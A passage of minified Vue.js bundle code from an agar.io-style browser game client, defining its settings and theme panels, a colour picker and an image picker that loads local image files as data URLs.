                            disabled: !e.showHud,
                            checked: e.showFPS
                        },
                        on: {
                            change: function(t) {
                                return e.change("showFPS", t)
                            }
                        }
                    }, [e._v("Stats: FPS")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showPing
                        },
                        on: {
                            change: function(t) {
                                return e.change("showPing", t)
                            }
                        }
                    }, [e._v("Stats: Ping")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showPlayerMass
                        },
                        on: {
                            change: function(t) {
                                return e.change("showPlayerMass", t)
                            }
                        }
                    }, [e._v("Stats: Current mass")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showPlayerScore
                        },
                        on: {
                            change: function(t) {
                                return e.change("showPlayerScore", t)
                            }
                        }
                    }, [e._v("Stats: Score")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showCellCount
                        },
                        on: {
                            change: function(t) {
                                return e.change("showCellCount", t)
                            }
                        }
                    }, [e._v("Stats: Cell count")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showClock
                        },
                        on: {
                            change: function(t) {
                                return e.change("showClock", t)
                            }
                        }
                    }, [e._v("Minimap stats: System time")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showSessionTime
                        },
                        on: {
                            change: function(t) {
                                return e.change("showSessionTime", t)
                            }
                        }
                    }, [e._v("Minimap stats: Session time")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showPlayerCount
                        },
                        on: {
                            change: function(t) {
                                return e.change("showPlayerCount", t)
                            }
                        }
                    }, [e._v("Minimap stats: Players in server")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showSpectators
                        },
                        on: {
                            change: function(t) {
                                return e.change("showSpectators", t)
                            }
                        }
                    }, [e._v("Minimap stats: Spectators")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.showHud,
                            checked: e.showRestartTiming
                        },
                        on: {
                            change: function(t) {
                                return e.change("showRestartTiming", t)
                            }
                        }
                    }, [e._v("Minimap stats: Server restart time")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.chatColorOnlyPeople
                        },
                        on: {
                            change: function(t) {
                                return e.change("chatColorOnlyPeople", t)
                            }
                        }
                    }, [e._v("Chat: Only colored name people")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.playerStats
                        },
                        on: {
                            change: function(t) {
                                return e.change("playerStats", t)
                            }
                        }
                    }, [e._v("Player tracker")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.debugStats
                        },
                        on: {
                            change: function(t) {
                                return e.change("debugStats", t)
                            }
                        }
                    }, [e._v("Network info")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.clientStats
                        },
                        on: {
                            change: function(t) {
                                return e.change("clientStats", t)
                            }
                        }
                    }, [e._v("Client info")])], 1)]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n        Chat\n    ")]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("div", {
                        staticClass: "row"
                    }, [e._v("\n                You can right-click name in chat to block them until server restart\n            ")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.showBlockedMessageCount
                        },
                        on: {
                            change: function(t) {
                                return e.change("showBlockedMessageCount", t)
                            }
                        }
                    }, [e._v("\n            Show blocked message count")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.filterChatMessages
                        },
                        on: {
                            change: function(t) {
                                return e.change("filterChatMessages", t)
                            }
                        }
                    }, [e._v("\n            Filter profanity")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.clearChatMessages
                        },
                        on: {
                            change: function(t) {
                                return e.change("clearChatMessages", t)
                            }
                        }
                    }, [e._v("\n            Clear on disconnect")])], 1)]), e._v(" "), s("div", {
                        staticClass: "reset-option-wrapper"
                    }, [s("span", {
                        staticClass: "reset-option",
                        on: {
                            click: function() {
                                return e.confirmReset()
                            }
                        }
                    }, [s("i", {
                        staticClass: "fa fa-undo"
                    }), e._v(" Reset\n        ")])])])
                };
            I._withStripped = !0;
            var k = s(1),
                b = s(4),
                _ = s(5),
                S = PIXI.utils.isWebGLSupported(),
                E = S && b.useWebGL;

            function x(e) {
                switch (e) {
                    case 0:
                        return "nobody else's";
                    case 1:
                        return "tag players'";
                    case 2:
                        return "everybody's";
                    default:
                        return "???"
                }
            }
            var B = (s(170), Object(v.a)({
                data: () => ({
                    clientHash: "",
                    isWebGLSupported: S,
                    useWebGL: E,
                    antialias:b.antialias,
                    ultrarender:b.ultrarender,
                    clearHud:b.clearHud,
                    gameResolution: b.gameResolution,
                    smallTextThreshold: b.smallTextThreshold,
                    autoZoom: b.autoZoom,
                    rememeberEjecting: b.rememeberEjecting,
                    autoRespawn: b.autoRespawn,
                    mbAutorespawn: b.mbAutorespawn,
                    mouseFreezeSoft: b.mouseFreezeSoft,
                    drawDelay: b.drawDelay,
                    switchDistance: b.switchDistance,
                    cameraMoveDelay: b.cameraMoveDelay,
                    cameraZoomDelay: b.cameraZoomDelay,
                    cameraZoomSpeed: b.cameraZoomSpeed,
                    replayDuration: b.replayDuration,
                    showReplaySaved: b.showReplaySaved,
                    showNames: b.showNames,
                    showMass: b.showMass,
                    showSkins: b.showSkins,
                    showOwnName: b.showOwnName,
                    showOwnMass: b.showOwnMass,
                    showOwnSkin: b.showOwnSkin,
                    showCrown: b.showCrown,
                    foodVisible: b.foodVisible,
                    eatAnimation: b.eatAnimation,
                    showHud: b.showHud,
                    showLeaderboard: b.showLeaderboard,
                    showServerName: b.showServerName,
                    showChat: b.showChat,
                    showChatToast: b.showChatToast,
                    minimapEnabled: b.minimapEnabled,
                    minimapLocations: b.minimapLocations,
                    showFPS: b.showFPS,
                    showPing: b.showPing,
                    showCellCount: b.showCellCount,
                    showPlayerScore: b.showPlayerScore,
                    showPlayerMass: b.showPlayerMass,
                    showClock: b.showClock,
                    showSessionTime: b.showSessionTime,
                    showPlayerCount: b.showPlayerCount,
                    showSpectators: b.showSpectators,
                    showRestartTiming: b.showRestartTiming,
                    debugStats: b.debugStats,
                    clientStats: b.clientStats,
                    playerStats: b.playerStats,
                    chatColorOnlyPeople: b.chatColorOnlyPeople,
                    showBlockedMessageCount: b.showBlockedMessageCount,
                    filterChatMessages: b.filterChatMessages,
                    clearChatMessages: b.clearChatMessages,
                    showCellLines: b.showCellLines,
                    showTag: b.showTag,
                    showDir: b.showDir,
                    gameAlpha: b.gameAlpha,
                    mbActive: b.mbActive
                }),
                computed: {
                    showNamesMeaning() {
                        return x(this.showNames)
                    },
                    showSkinsMeaning() {
                        return x(this.showSkins)
                    },
                    showMassMeaning() {
                        return x(this.showMass)
                    },
                    showReplaySavedMeaning() {
                        switch (this.showReplaySaved) {
                            case 0:
                                return "nowhere";
                            case 1:
                                return "in chat only";
                            case 2:
                                return "as notification";
                            default:
                                return "???"
                        }
                    },
                    showMultiboxMeaning() {
                        return ({
                            0: "None",
                            1: "Border",
                            2: "Arrow",
                            3: "Arrow"
                        })[this.mbActive]
                    }
                },
                methods: {
                    promptRestart() {
                        _.confirm("Refresh page to apply changes?", () => {
                            setTimeout(() => {
                                location.reload()
                            }, 500)
                        })
                    },
                    change(e, t) {
                        var s;
                        if (s = t && t.target ? isNaN(t.target.valueAsNumber) ? t.target.value : t.target.valueAsNumber : t, b[e] != s) {
                            switch (this[e] = s, b.set(e, s), e) {
                                case "backgroundColor":
                                    var i = PIXI.utils.string2hex(s);
                                    k.renderer.backgroundColor = i;
                                    break;
                                case "minimapLocations":
                                    k.events.$emit("minimap-show-locations", s);
                                    break;
                                case "showHud":
                                    k.app.showHud = s;
                                    break;
                                case "showChatToast":
                                    k.events.$emit("chat-visible", {
                                        visibleToast: s
                                    })
                            }
                            if (k.running) switch (e) {
                                case "showNames":
                                case "showSkins":
                                case "showMass":
                                case "showOwnName":
                                case "showOwnSkin":
                                case "showOwnMass":
                                    k.playerManager.invalidateVisibility();
                                    break;
                                case "gameAlpha":
                                    GAME.scene.container.alpha = s;
                                    break;
                                case "foodVisible":
                                    k.scene.food.visible = s;
                                    break;
                                case "showLeaderboard":
                                    k.events.$emit("leaderboard-visible", s);
                                    break;
                                case "minimapEnabled":
                                    s ? k.events.$emit("minimap-show") : k.events.$emit("minimap-hide");
                                    break;
                                case "showFPS":
                                case "showPing":
                                case "showPlayerMass":
                                case "showPlayerScore":
                                case "showCellCount":
                                    k.events.$emit("stats-invalidate-shown");
                                    break;
                                case "showClock":
                                case "showSessionTime":
                                case "showSpectators":
                                case "showPlayerCount":
                                case "showRestartTiming":
                                    k.events.$emit("minimap-stats-invalidate-shown");
                                    break;
                                case "showChat":
                                    k.events.$emit("chat-visible", {
                                        visible: s
                                    });
                                    break;
                                case "showBlockedMessageCount":
                                    k.events.$emit("show-blocked-message-count", s)
                            }
                        }
                    },
                    confirmReset() {
                        _.confirm("Are you sure you want to reset all setting options?", () => this.reset())
                    },
                    reset() {
                        var e = ["clientHash", "isWebGLSupported"];
                        for (var t in this.$data) e.includes(t) || this.change(t, b.getDefault(t))
                    }
                }
            }, I, [], !1, null, "3ddebeb3", null));
            B.options.__file = "src/components/settings.vue";
            var Q = B.exports,
                M = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticClass: "container"
                    }, [s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n        Colors and images\n    ")]), e._v(" "), s("div", {
                        staticClass: "options two-columns"
                    }, [s("span", [s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Background")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.backgroundColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("backgroundColor", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Map border")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.borderColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("borderColor", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input",
                        class: {
                            disabled: !e.useFoodColor
                        }
                    }, [s("span", [e._v("Food")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            disabled: !e.useFoodColor,
                            value: e.foodColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("foodColor", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Ejected cells")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.ejectedColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("ejectedColor", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Active cell")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.mbColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("mbColor", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Name outline")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.cellNameOutlineColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellNameOutlineColor", t)
                            }
                        }
                    })], 1)]), e._v(" "), s("span", [s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Cursor")]), e._v(" "), s("image-option", {
                        staticClass: "right",
                        attrs: {
                            width: "32",
                            defaults: "",
                            value: e.cursorImageUrl
                        },
                        on: {
                            input: function(t) {
                                return e.change("cursorImageUrl", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input",
                        class: {
                            disabled: !e.showBackgroundImage
                        }
                    }, [s("span", [e._v("Map image")]), e._v(" "), s("image-option", {
                        staticClass: "right",
                        attrs: {
                            width: "330",
                            defaults: e.bgDefault,
                            disabled: !e.showBackgroundImage,
                            value: e.backgroundImageUrl
                        },
                        on: {
                            input: function(t) {
                                return e.change("backgroundImageUrl", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Viruses")]), e._v(" "), s("image-option", {
                        staticClass: "right",
                        attrs: {
                            width: "100",
                            defaults: e.virusDefault,
                            value: e.virusImageUrl
                        },
                        on: {
                            input: function(t) {
                                return e.change("virusImageUrl", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Multi arrow")]), e._v(" "), s("image-option", {
                        staticClass: "right",
                        attrs: {
                            width: "100",
                            defaults: e.mbArrowDefault,
                            value: e.mbArrow
                        },
                        on: {
                            input: function(t) {
                                return e.change("mbArrow", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Mass text")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.cellMassColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellMassColor", t)
                            }
                        }
                    })], 1), e._v(" "), s("div", {
                        staticClass: "color-input"
                    }, [s("span", [e._v("Mass outline")]), e._v(" "), s("color-option", {
                        staticClass: "right",
                        attrs: {
                            value: e.cellMassOutlineColor
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellMassOutlineColor", t)
                            }
                        }
                    })], 1)])])]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n        Map\n        "), e.useWebGL ? e._e() : s("span", {
                        staticClass: "right silent"
                    }, [e._v("Needs GPU rendering")])]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.useFoodColor
                        },
                        on: {
                            change: function(t) {
                                return e.change("useFoodColor", t)
                            }
                        }
                    }, [e._v("Custom food color")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.useWebGL,
                            checked: e.showBackgroundImage
                        },
                        on: {
                            change: function(t) {
                                return e.change("showBackgroundImage", t)
                            }
                        }
                    }, [e._v("Show map image")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.useWebGL || !e.showBackgroundImage,
                            checked: e.backgroundImageRepeat
                        },
                        on: {
                            change: function(t) {
                                return e.change("backgroundImageRepeat", t)
                            }
                        }
                    }, [e._v("Repeat map image")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            disabled: !e.useWebGL || !e.showBackgroundImage,
                            checked: e.backgroundDefaultIfUnequal
                        },
                        on: {
                            change: function(t) {
                                return e.change("backgroundDefaultIfUnequal", t)
                            }
                        }
                    }, [e._v("Always crop map image")]), e._v(" "), s("div", {
                        staticClass: "slider-option bottom-margin",
                        class: {
                            disabled: !e.useWebGL || !e.showBackgroundImage
                        }
                    }, [e._v("\n            Map image opacity "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s((100 * e.backgroundImageOpacity).toFixed(0)) + "%")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            disabled: !e.useWebGL || !e.showBackgroundImage,
                            min: "0.1",
                            max: "1",
                            step: "0.05"
                        },
                        domProps: {
                            value: e.backgroundImageOpacity
                        },
                        on: {
                            input: function(t) {
                                return e.change("backgroundImageOpacity", t)
                            }
                        }
                    })])], 1)]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\r\n            Name text\r\n        ")]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("div", {
                        staticClass: "bottom-margin"
                    }, [e._v("\n            Font\n            "), s("input", {
                        attrs: {
                            type: "text",
                            spellcheck: "false",
                            placeholder: "Hind Madurai",
                            maxlength: "30"
                        },
                        domProps: {
                            value: e.cellNameFont
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellNameFont", t)
                            },
                            focus: function() {
                                return e.fontWarning("name", !0)
                            },
                            blur: function() {
                                return e.fontWarning("name", !1)
                            }
                        }
                    })]), e._v(" "), e.showNameFontWarning ? [s("div", {
                        staticClass: "silent"
                    }, [e._v("It must be installed on your device.")]), e._v(" "), s("div", {
                        staticClass: "silent"
                    }, [e._v("If it still doesn't show, restart your PC")])] : e._e(), e._v(" "), s("div", {
                        staticClass: "inline-range"
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.cellNameWeight
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellNameWeight", t)
                            }
                        }
                    }), e._v("\n            " + e._s(e.cellNameWeightMeaning) + " name text\n        ")]), e._v(" "), s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.cellNameOutline
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "3",
                            step: "1"
                        },
                        domProps: {
                            value: e.cellNameOutline
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellNameOutline", t)
                            }
                        }
                    }), e._v("\n            " + e._s(e.cellNameOutlineMeaning) + " name outline\n        ")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.cellNameSmoothOutline
                        },
                        on: {
                            change: function(t) {
                                return e.change("cellNameSmoothOutline", t)
                            }
                        }
                    }, [e._v("Smooth name outline")]), e._v(" "), s("div", {
                        staticClass: "slider-option"
                    }, [e._v("\r\n                Long name threshold "), s("span", {
                        staticClass: "right"
                    }, [e._v(e._s(e.cellLongNameThreshold) + "px")]), e._v(" "), s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "500",
                            max: "1250",
                            step: "50"
                        },
                        domProps: {
                            value: e.cellLongNameThreshold
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellLongNameThreshold", t)
                            }
                        }
                    })])], 2)]), e._v(" "), s("div", {
                        staticClass: "section row"
                    }, [s("div", {
                        staticClass: "header"
                    }, [e._v("\n        Mass text\n    ")]), e._v(" "), s("div", {
                        staticClass: "options"
                    }, [s("div", {
                        staticClass: "bottom-margin"
                    }, [e._v("\n            Font\n            "), s("input", {
                        attrs: {
                            type: "text",
                            spellcheck: "false",
                            placeholder: "Ubuntu",
                            maxlength: "30"
                        },
                        domProps: {
                            value: e.cellMassFont
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellMassFont", t)
                            },
                            focus: function() {
                                return e.fontWarning("mass", !0)
                            },
                            blur: function() {
                                return e.fontWarning("mass", !1)
                            }
                        }
                    })]), e._v(" "), e.showMassFontWarning ? [s("div", {
                        staticClass: "silent"
                    }, [e._v("It must be installed on your device.")]), e._v(" "), s("div", {
                        staticClass: "silent"
                    }, [e._v("If it still doesn't show, restart your PC")])] : e._e(), e._v(" "), s("div", {
                        staticClass: "inline-range"
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "2",
                            step: "1"
                        },
                        domProps: {
                            value: e.cellMassWeight
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellMassWeight", t)
                            }
                        }
                    }), e._v("\n            " + e._s(e.cellMassWeightMeaning) + " mass text\n        ")]), e._v(" "), s("div", {
                        staticClass: "inline-range",
                        class: {
                            off: !e.cellMassOutline
                        }
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "3",
                            step: "1"
                        },
                        domProps: {
                            value: e.cellMassOutline
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellMassOutline", t)
                            }
                        }
                    }), e._v("\n            " + e._s(e.cellMassOutlineMeaning) + " mass outline\r\n            ")]), e._v(" "), s("div", {
                        staticClass: "inline-range"
                    }, [s("input", {
                        staticClass: "slider",
                        attrs: {
                            type: "range",
                            min: "0",
                            max: "3",
                            step: "1"
                        },
                        domProps: {
                            value: e.cellMassTextSize
                        },
                        on: {
                            input: function(t) {
                                return e.change("cellMassTextSize", t)
                            }
                        }
                    }), e._v("\n            " + e._s(e.cellMassTextSizeMeaning) + " mass text size\n        ")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.cellMassSmoothOutline
                        },
                        on: {
                            change: function(t) {
                                return e.change("cellMassSmoothOutline", t)
                            }
                        }
                    }, [e._v("Smooth mass outline")]), e._v(" "), s("p-check", {
                        staticClass: "p-switch",
                        attrs: {
                            checked: e.shortMass
                        },
                        on: {
                            change: function(t) {
                                return e.change("shortMass", t)
                            }
                        }
                    }, [e._v("Short mass format")])], 2)]), e._v(" "), s("div", {
                        staticClass: "reset-option-wrapper"
                    }, [s("span", {
                        staticClass: "reset-option",
                        on: {
                            click: function() {
                                return e.confirmReset()
                            }
                        }
                    }, [s("i", {
                        staticClass: "fa fa-undo"
                    }), e._v(" Reset\n    ")])])])
                };
            M._withStripped = !0;
            var T = function() {
                var e = this,
                    t = e.$createElement,
                    s = e._self._c || t;
                return s("div", {
                    staticClass: "color-button",
                    class: {
                        disabled: e.disabled
                    },
                    style: {
                        backgroundColor: "#" + e.hex,
                        borderRadius:"50%"
                    },
                    on: {
                        mousedown: function() {
                            e.disabled || e.showPicker(!0)
                        }
                    }
                }, [e.pickerOpen ? s("div", {
                    staticClass: "color-picker-wrapper",
                    on: {
                        mousedown: function(t) {
                            return e.startMovingPivot(t)
                        },
                        mousemove: function(t) {
                            return e.movePivot(t)
                        },
                        mouseup: function(t) {
                            return e.stopMovingPivot(t)
                        }
                    }
                }, [s("div", {
                    staticClass: "color-picker-overlay"
                }), e._v(" "), s("div", {
                    staticClass: "color-picker fade-box"
                }, [s("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: e.hue,
                        expression: "hue"
                    }],
                    staticClass: "color-picker-hue",
                    attrs: {
                        type: "range",
                        min: "0",
                        max: "360",
                        step: "1"
                    },
                    domProps: {
                        value: e.hue
                    },
                    on: {
                        change: function() {
                            return e.triggerInput()
                        },
                        __r: function(t) {
                            e.hue = t.target.value
                        }
                    }
                }), e._v(" "), s("div", {
                    staticClass: "color-picker-clr",
                    style: {
                        backgroundColor: "hsl(" + e.hue + ", 100%, 50%)"
                    }
                }, [s("div", {
                    staticClass: "color-picker-sat"
                }, [s("div", {
                    staticClass: "color-picker-val"
                }, [s("div", {
                    staticClass: "color-picker-pivot",
                    style: {
                        left: 100 * e.sat + "px",
                        top: 100 - 100 * e.val + "px"
                    }
                })])])]), e._v(" "), s("div", {
                    staticClass: "color-picker-hex"
                }, [s("span", {
                    staticClass: "color-picker-hashtag"
                }, [e._v("#")]), e._v(" "), s("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: e.hex,
                        expression: "hex"
                    }],
                    staticClass: "color-picker-hex",
                    attrs: {
                        type: "text",
                        spellcheck: "false",
                        maxlength: "6",
                        placeholder: "000000"
                    },
                    domProps: {
                        value: e.hex
                    },
                    on: {
                        input: [function(t) {
                            t.target.composing || (e.hex = t.target.value)
                        }, function() {
                            return e.triggerInput()
                        }]
                    }
                })])])]) : e._e()])
            };
            T._withStripped = !0;
            var D = (s(172), Object(v.a)({
                data: () => ({
                    pickerOpen: !1,
                    movingPivot: !1,
                    hue: 0,
                    sat: 0,
                    val: 0
                }),
                props: ["value", "disabled"],
                computed: {
                    hex: {
                        get() {
                            return function(e, t, s) {
                                var i, a, n, o, r, l, c, h;
                                switch (l = s * (1 - t), c = s * (1 - (r = 6 * e - (o = Math.floor(6 * e))) * t), h = s * (1 - (1 - r) * t), o % 6) {
                                    case 0:
                                        i = s, a = h, n = l;
                                        break;
                                    case 1:
                                        i = c, a = s, n = l;
                                        break;
                                    case 2:
                                        i = l, a = s, n = h;
                                        break;
                                    case 3:
                                        i = l, a = c, n = s;
                                        break;
                                    case 4:
                                        i = h, a = l, n = s;
                                        break;
                                    case 5:
                                        i = s, a = l, n = c
                                }
                                return (i = Math.ceil(255 * i).toString(16).padStart(2, "0")) + (a = Math.ceil(255 * a).toString(16).padStart(2, "0")) + Math.ceil(255 * n).toString(16).padStart(2, "0")
                            }(this.hue / 360, this.sat, this.val)
                        },
                        set(e) {
                            if (e = e.toLowerCase(), /^[0-9a-f]{6}$/.test(e)) {
                                var t, s, i, a, n, o, r, l = (t = e, s = parseInt(t.slice(0, 2), 16) / 255, i = parseInt(t.slice(2, 4), 16) / 255, a = parseInt(t.slice(4, 6), 16) / 255, [60 * ((r = (o = (n = Math.max(s, i, a)) - Math.min(s, i, a)) && (n == s ? (i - a) / o : n == i ? 2 + (a - s) / o : 4 + (s - i) / o)) < 0 ? r + 6 : r), n && o / n, n]);
                                this.hue = l[0], this.sat = l[1], this.val = l[2]
                            }
                        }
                    }
                },
                methods: {
                    showPicker(e) {
                        this.pickerOpen = e
                    },
                    startMovingPivot(e) {
                        var t = e.target.classList;
                        if (t.contains("color-picker-overlay")) return this.showPicker(!1), void e.stopPropagation();
                        (t.contains("color-picker-pivot") || t.contains("color-picker-val")) && (this.movingPivot = !0, this.movePivot(e))
                    },
                    movePivot(e) {
                        if (this.movingPivot) {
                            var t = this.$el.querySelector(".color-picker-val").getBoundingClientRect(),
                                s = e.clientX - t.x,
                                i = e.clientY - t.y;
                            this.sat = s / 100, this.val = 1 - i / 100, this.sat = Math.min(Math.max(this.sat, 0), 1), this.val = Math.min(Math.max(this.val, 0), 1)
                        }
                    },
                    stopMovingPivot(e) {
                        this.movingPivot && (this.movePivot(e), this.movingPivot = !1, this.triggerInput())
                    },
                    triggerInput() {
                        this.$emit("input", this.hex)
                    }
                },
                created() {
                    this.value && (this.hex = this.value)
                }
            }, T, [], !1, null, "5b0666af", null));
            D.options.__file = "src/components/color-option.vue";
            var L = D.exports,
                N = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticClass: "image-button",
                        class: {
                            disabled: e.disabled
                        },
                        style: {
                            backgroundColor: "#" + e.hex
                        },
                        on: {
                            mousedown: function() {
                                e.disabled || e.showPicker(!0)
                            }
                        }
                    }, [s("div", {
                        staticClass: "image-button-text"
                    }, [e._v("...")]), e._v(" "), e.pickerOpen ? s("div", {
                        staticClass: "image-picker-wrapper",
                        on: {
                            click: function(t) {
                                return e.tryHidePicker(t)
                            }
                        }
                    }, [s("div", {
                        staticClass: "image-picker-overlay"
                    }), e._v(" "), s("div", {
                        staticClass: "image-picker fade-box"
                    }, [s("img", {
                        staticClass: "image-picker-preview",
                        style: {
                            maxWidth: (e.value ? e.width : 200) + "px"
                        },
                        attrs: {
                            src: e.value,
                            alt: "No image chosen or it is invalid"
                        },
                        on: {
                            click: function() {
                                return e.openFileChooser()
                            },
                            dragover: function(t) {
                                return e.allowDrop(t)
                            },
                            drop: function(t) {
                                return e.onImageDrop(t)
                            }
                        }
                    }), e._v(" "), s("div", {
                        staticClass: "image-picker-information"
                    }, [e._v("\n            Click or drop onto image to change."), s("br"), e._v(" "), "defaults" in this ? s("span", {
                        staticClass: "image-picker-reset",
                        on: {
                            click: function() {
                                return e.triggerInput(e.defaults)
                            }
                        }
                    }, [e._v("Reset to default")]) : e._e()]), e._v(" "), s("input", {
                        staticClass: "image-picker-input",
                        attrs: {
                            type: "file",
                            accept: "image/png, image/jpeg, image/bmp, image/webp"
                        },
                        on: {
                            change: function(t) {
                                return e.onImageSelect(t)
                            }
                        }
                    })])]) : e._e()])
                };
            N._withStripped = !0;
            var U = (s(174), Object(v.a)({
                data: () => ({
                    pickerOpen: !1,
                    fileReader: null
                }),
                props: ["value", "width", "disabled", "defaults"],
                methods: {
                    showPicker(e) {
                        !this.pickerOpen && e && (this.imageLoadedOnce = !1), this.pickerOpen = e
                    },
                    tryHidePicker(e) {
                        e.target.classList.contains("image-picker-overlay") && (this.showPicker(!1), e.stopPropagation())
                    },
                    triggerInput(e) {
                        this.$emit("input", e)
                    },
                    openFileChooser() {
                        this.$el.querySelector(".image-picker-input").click()
                    },
                    allowDrop(e) {
                        e.preventDefault()
                    },
                    getFileReader() {
                        var e = new FileReader;
                        return e.addEventListener("load", e => {
                            this.triggerInput(e.target.result)
                        }), e
                    },
                    onImageSelect(e) {
                        if (0 !== e.target.files.length) {
                            var t = e.target.files[0];
                            t.type.startsWith("image/") && this.getFileReader().readAsDataURL(t)
                        }
                    },
                    onImageDrop(e) {
                        if (e.preventDefault(), 0 !== e.dataTransfer.files.length) {
                            var t = e.dataTransfer.files[0];
                            t.type.startsWith("image/") && this.getFileReader().readAsDataURL(t)
                        }
                    }
                }
            }, N, [], !1, null, "641581b7", null));
            U.options.__file = "src/components/image-option.vue";
            var R = U.exports,
                P = function() {
                    var e = this.$createElement;
                    return (this._self._c || e)("div")
                };
            P._withStripped = !0;
            var F = Object(v.a)({
                data: () => ({
                    hello: 123
                })
            }, P, [], !1, null, "384e68ec", null);
            F.options.__file = "src/components/template.vue", F.exports;
            var G = s(1),
                H = s(4),
                O = s(5);

            function Y(e) {
                switch (e) {
                    case 0:
                        return "Thin";
                    case 1:
                        return "Normal";
                    case 2:
                        return "Bold";
                    default:
